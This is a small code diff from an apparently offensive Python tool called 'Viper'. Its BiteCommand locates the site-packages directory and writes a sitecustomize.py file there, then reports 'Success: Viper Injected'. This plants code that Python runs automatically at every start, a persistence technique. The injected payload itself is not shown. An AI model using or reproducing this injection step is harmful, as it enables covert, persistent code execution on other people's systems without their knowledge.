@@ -16,10 +16,11 @@ class BiteCommand(CommandFactory):
         parser_setup.set_defaults(action=self.run)
 
     @staticmethod
-    def run(args):
+    def run(args=None):
         site_packages = next(p for p in sys.path if 'site-packages' in p)
         site_file = os.path.join(site_packages, 'sitecustomize.py')
-        create_file(site_file)
+        if create_file(site_file):
+            print("Success: Viper Injected")
 
 
 if __name__ == "__main__":
